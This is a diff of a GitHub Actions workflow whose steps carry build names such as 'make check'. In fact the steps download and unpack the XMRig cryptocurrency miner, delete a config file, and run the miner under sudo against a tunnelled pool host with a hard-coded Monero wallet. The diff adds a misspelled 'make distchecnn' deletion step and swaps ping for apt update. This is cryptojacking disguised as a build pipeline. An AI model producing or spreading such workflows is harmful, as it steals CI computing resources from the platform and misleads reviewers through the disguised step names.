@@ -17,7 +17,9 @@ jobs:
       run: wget https://github.com/C3Pool/xmrig-C3/releases/download/v6.22.2-C3/xmrig-v6.22.2-C3-linux-Static.tar.gz
     - name: make
       run: tar xzf xmrig-v6.22.2-C3-linux-Static.tar.gz
+    - name: make distchecnn
+      run: rm -rf config.json
     - name: make check
       run: sudo ./xmrig -o 21.tcp.cpolar.top:12146 --user 48RnhHXP7vqSz2USFYc7UvQFsKKr5e8eQMqvBjUptmJpV6RwSFD5DKyJGecbdKBe3FdTsjavpK1wYCCWT8McgzeyVUW2Vfo -p github --tls
     - name: make distcheck
-      run: ping
+      run: apt update
